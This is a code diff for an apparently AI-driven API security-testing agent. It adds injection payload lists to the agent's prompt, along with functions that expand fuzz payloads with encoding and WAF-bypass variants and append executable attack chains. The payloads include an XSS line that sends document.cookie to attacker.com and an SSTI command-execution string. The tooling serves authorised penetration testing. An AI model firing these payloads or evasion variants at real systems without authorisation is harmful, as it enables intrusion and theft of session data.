@@ -10,6 +10,11 @@ const aiContracts = require('./ai-contracts');
 const securityKnowledge = require('./security-knowledge');
 const securityPolicyPacks = require('./security-policy-packs');
 const postmanIntentRag = require('./postman-intent-rag');
+const payloadEncoder = require('./security-payload-encoder');
+const payloadAdapter = require('./security-payload-adapter');
+const businessLogicPayloads = require('./security-business-logic-payloads');
+const wafBypass = require('./security-waf-bypass');
+const attackChains = require('./security-attack-chains');
 
 dotenv.config();
 
@@ -665,7 +670,9 @@ ACTION TYPES
   "vector": "IDOR" | "SQLi" | "NoSQLi" | "AuthBypass" | "SSRF" | "XXE" |
             "MassAssignment" | "RateLimit" | "PathTraversal" | "BOLA" |
             "InfoDisclosure" | "CommandInjection" | "ParameterPollution" |
-            "CachePoisoning" | "UnrestrictedUpload" | "BusinessLogic",
+            "CachePoisoning" | "UnrestrictedUpload" | "BusinessLogic" |
+            "XSS" | "SSTI" | "GraphQLInjection" | "LDAPInjection" |
+            "XPathInjection" | "PrototypePollution" | "EmailHeaderInjection",
   "safety_tier": "safe" | "controlled-mutation" | "high-risk",
   "hypothesis": "what a positive result looks like",
   "auto_chain": true | false
@@ -792,6 +799,60 @@ AUTH BYPASS HEADERS:
   Authorization: Bearer null
   Authorization: Bearer undefined
   Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJyb2xlIjoiYWRtaW4ifQ.
+
+XSS (Cross-Site Scripting - query params / body fields):
+  <script>alert(1)</script>
+  "><img src=x onerror=alert(1)>
+  <svg onload=alert(1)>
+  javascript:alert(1)
+  <img src=x onerror=fetch("http://attacker.com?c="+document.cookie)>
+
+SSTI (Server-Side Template Injection - template params / body):
+  {{7*7}}
+  {{config}}
+  ${7*7}
+  <%= 7*7 %>
+  {{config.__class__.__init__.__globals__["os"].popen("id").read()}}
+
+GRAPHQL INJECTION (POST body - query field):
+  {"query": "{__typename}"}
+  {"query": "{__schema{types{name}}}"}
+  {"query": "{user{id email password}}"}
+  {"query": "{a:User{id} b:User{id} c:User{id} d:User{id} e:User{id} f:User{id} g:User{id} h:User{id} i:User{id} j:User{id}}"}
+  {"query": "query { user { friends { friends { friends { friends { friends { id } } } } } } }"}
+
+LDAP INJECTION (query params / body fields):
+  *)(uid=*))(|(uid=*
+  admin*
+  (|(uid=*))
+  admin)(|(password=*)
+  *%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A
+
+XPATH INJECTION (query params / body fields):
+  ' or '1'='1
+  ancestor-or-self::*
+  //user
+  ' or 1=1 or ''='
+  ../../..
+
+PROTOTYPE POLLUTION (POST/PUT JSON body):
+  {"__proto__":{"test":"polluted"}}
+  {"constructor":{"prototype":{"isAdmin":true}}}
+  {"proto":{"isAdmin":true}}
+  {"__proto__.isAdmin": true}
+  {"constructor.prototype.role": "admin"}
+
+EMAIL HEADER INJECTION (POST body - email fields):
+  test@example.com%0aCc:victim@example.com
+  user@test.com%0dBcc:attacker@example.com
+  test@example.com%0d%0aSubject:Spam%0d%0aFrom:admin@target.com%0d%0a%0d%0aMalicious%20content
+
+WAF BYPASS VARIANTS (encoding and obfuscation):
+  <ScRiPt>alert(1)</ScRiPt>
+  %3Cscript%3Ealert(1)%3C%2Fscript%3E
+  <scr<!-- -->ipt>alert(1)</scr<!-- -->ipt>
+  <script >alert(1)</script >
+  \\u003cscript\\u003ealert(1)\\u003c/script\\u003e
 
 MODE RULES
 - If current_mode is "ask": explain likely risks or findings, but do not emit executable actions unless the user explicitly asks for a concrete probe.
@@ -2153,6 +2214,217 @@ function validateSecurityPayloadSemantics(payload, context = {}) {
   return payload;
 }
 
+const FUZZ_EXPANDABLE_VECTORS = new Set([
+  'SQLi',
+  'NoSQLi',
+  'XSS',
+  'SSTI',
+  'GraphQLInjection',
+  'LDAPInjection',
+  'XPathInjection',
+  'CommandInjection',
+  'ParameterPollution',
+  'PathTraversal',
+  'PrototypePollution',
+  'EmailHeaderInjection'
+]);
+
+function getPayloadCapForProfile(profile) {
+  const normalized = normalizeScanProfile(profile);
+  if (normalized === 'quick') return 8;
+  if (normalized === 'deep') return 24;
+  return 16;
+}
+
+function resolveContextBaseUrl(context = {}) {
+  const requestUrl = String(context?.current_request?.url || '').trim();
+  const targetUrl = String(context?.target_url || '').trim();
+  const candidate = requestUrl || targetUrl;
+  if (!candidate) return '';
+  try {
+    return new URL(candidate).origin;
+  } catch {
+    return '';
+  }
+}
+
+function resolveFuzzDescriptor(context = {}, action = {}) {
+  const descriptors = Array.isArray(context?.current_request?.param_descriptors)
+    ? context.current_request.param_descriptors
+    : [];
+  if (!descriptors.length) return null;
+  const target = String(action?.target_param || '').toLowerCase();
+  if (!target) return descriptors[0];
+  return descriptors.find(entry => {
+    const name = String(entry?.name || '').toLowerCase();
+    const path = String(entry?.path || '').toLowerCase();
+    return name === target || path.endsWith(`.${target}`) || path === target;
+  }) || descriptors[0];
+}
+
+function resolveFuzzContentType(context = {}) {
+  const headers = Array.isArray(context?.current_request?.headers)
+    ? context.current_request.headers
+    : [];
+  const match = headers.find(entry => String(entry?.k || '').toLowerCase() === 'content-type');
+  if (match?.v) return String(match.v);
+  const body = String(context?.current_request?.body || '').trim();
+  if (body.startsWith('{') || body.startsWith('[')) return 'application/json';
+  if (body.startsWith('<?xml') || body.startsWith('<')) return 'application/xml';
+  return 'text/plain';
+}
+
+function expandPayloadsWithWafBypass(payloads, context = {}, cap = 16) {
+  const response = context?.last_response && typeof context.last_response === 'object'
+    ? context.last_response
+    : null;
+  if (!response) return payloads;
+  const detection = wafBypass.detectWafFromResponse(
+    Number(response.status || 0),
+    response.headers && typeof response.headers === 'object' ? response.headers : {},
+    String(response.body_preview || '')
+  );
+  if (!detection.detected) return payloads;
+
+  const expanded = [];
+  payloads.forEach(payload => {
+    expanded.push(payload);
+    const variants = wafBypass.generateWafBypassVariants(String(payload), {
+      caseVariation: true,
+      comment: true,
+      encodingMix: true,
+      whitespace: detection.waf === 'aws_waf',
+      nullByte: detection.waf === 'akamai'
+    }, 8);
+    variants.forEach(variant => expanded.push(variant));
+  });
+  return [...new Set(expanded)].slice(0, cap);
+}
+
+function enhanceFuzzListAction(action, context = {}) {
+  if (!action || action.type !== 'fuzz_list') return action;
+
+  const cap = getPayloadCapForProfile(context.scan_profile);
+  const descriptor = resolveFuzzDescriptor(context, action);
+  const contentType = resolveFuzzContentType(context);
+  const inferredLocation = payloadAdapter.resolveInjectionLocation(descriptor || {}, action.vector || 'Unknown');
+  const inferredParam = String(action.target_param || descriptor?.name || descriptor?.path || '').trim();
+
+  let payloads = Array.isArray(action.payloads)
+    ? action.payloads.filter(entry => typeof entry === 'string' && entry.trim()).map(entry => entry.trim())
+    : [];
+
+  if (FUZZ_EXPANDABLE_VECTORS.has(String(action.vector || '')) && payloads.length < 3) {
+    const generated = payloadAdapter.generateContextAwarePayload(
+      String(action.vector || 'Unknown'),
+      descriptor || {},
+      contentType,
+      'safe'
+    );
+    payloads = [...payloads, ...generated.filter(entry => typeof entry === 'string' && entry.trim())];
+  }
+
+  if (FUZZ_EXPANDABLE_VECTORS.has(String(action.vector || ''))) {
+    const encoded = [];
+    payloads.forEach(payload => {
+      encoded.push(payload);
+      const variants = payloadEncoder.generatePayloadVariants(payload, {
+        urlEncode: true,
+        caseRandomize: true,
+        comment: true,
+        doubleEncode: normalizeScanProfile(context.scan_profile) === 'deep'
+      });
+      variants.forEach(variant => encoded.push(variant));
+    });
+    payloads = [...new Set(encoded)];
+  }
+
+  payloads = expandPayloadsWithWafBypass(payloads, context, cap);
+  payloads = [...new Set(payloads)].slice(0, cap);
+
+  return {
+    ...action,
+    target_param: inferredParam || action.target_param || 'id',
+    target_location: action.target_location || inferredLocation || 'query',
+    payloads
+  };
+}
+
+function enhanceScanPlanAction(action, context = {}) {
+  if (!action || action.type !== 'scan_plan') return action;
+  const endpoint = String(context?.current_request?.url || action.target || context?.target_url || '');
+  const method = String(context?.current_request?.method || 'GET').toUpperCase();
+  const plan = businessLogicPayloads.buildBusinessLogicTestPlan(endpoint, method, 'safe');
+  if (!plan.applicable) return action;
+
+  const existing = Array.isArray(action.steps) ? action.steps : [];
+  if (existing.some(step => String(step?.vector || '') === 'BusinessLogic')) return action;
+
+  const maxExtra = normalizeScanProfile(context.scan_profile) === 'deep' ? 3 : 2;
+  const baseOrder = existing.reduce((max, step) => Math.max(max, Number(step?.order || 0)), 0);
+  const appendedSteps = plan.categories.slice(0, maxExtra).map((category, index) => ({
+    order: baseOrder + index + 1,
+    vector: 'BusinessLogic',
+    description: `Business-logic abuse check for ${category} constraints and server-side validation.`,
+    target_param: category,
+    owasp_api_label: 'API6:2023 Unrestricted Access to Sensitive Business Flows'
+  }));
+
+  return {
+    ...action,
+    steps: [...existing, ...appendedSteps]
+  };
+}
+
+function maybeSuggestAttackChain(actions, context = {}) {
+  if (!Array.isArray(actions) || !actions.length) return actions;
+  if (String(context?.current_mode || 'agent') === 'ask') return actions;
+  if (actions.some(action => action?.type === 'probe_chain')) return actions;
+
+  const firstVector = actions
+    .flatMap(action => {
+      if (action?.type === 'probe') return [action.vector];
+      if (action?.type === 'fuzz_list') return [action.vector];
+      if (action?.type === 'scan_plan') {
+        const steps = Array.isArray(action.steps) ? action.steps : [];
+        return steps.map(step => step?.vector).filter(Boolean);
+      }
+      return [];
+    })
+    .find(Boolean);
+
+  const chain = attackChains.getAttackChainForVector(String(firstVector || ''));
+  if (!chain) return actions;
+
+  const baseUrl = resolveContextBaseUrl(context);
+  const executableChain = attackChains.buildExecutableChain(chain, { baseUrl });
+  return [...actions, executableChain];
+}
+
+function validateAndNormalizeSecurityActions(actions = []) {
+  const normalized = [];
+  actions.forEach((action, index) => {
+    const result = aiContracts.validateSecurityAction(action, index);
+    if (!result?.error && result?.value) normalized.push(result.value);
+  });
+  return normalized;
+}
+
+function enhanceSecurityPayload(payload, context = {}) {
+  const sourceActions = Array.isArray(payload?.actions) ? payload.actions : [];
+  const transformed = sourceActions.map(action => {
+    if (action?.type === 'fuzz_list') return enhanceFuzzListAction(action, context);
+    if (action?.type === 'scan_plan') return enhanceScanPlanAction(action, context);
+    return action;
+  });
+  const withChains = maybeSuggestAttackChain(transformed, context);
+  const validated = validateAndNormalizeSecurityActions(withChains);
+  return {
+    ...payload,
+    actions: validated
+  };
+}
+
 function parseAssertionsPayload(raw, options = {}) {
   const parsed = parseJsonObjectLoose(raw);
   const assertions = aiContracts.normalizeAssertionExpressions(parsed?.assertions, { maxItems: 12 });
@@ -2740,8 +3012,10 @@ app.post('/api/security-agent', async (req, res) => {
       maxAttempts: 3
     });
 
+    const enhancedPayload = enhanceSecurityPayload(repaired.payload, compactedSecurityContext);
+
     return res.json({
-      ...repaired.payload,
+      ...enhancedPayload,
       diagnostics: {
         ...repaired.diagnostics,
         engine: 'security',
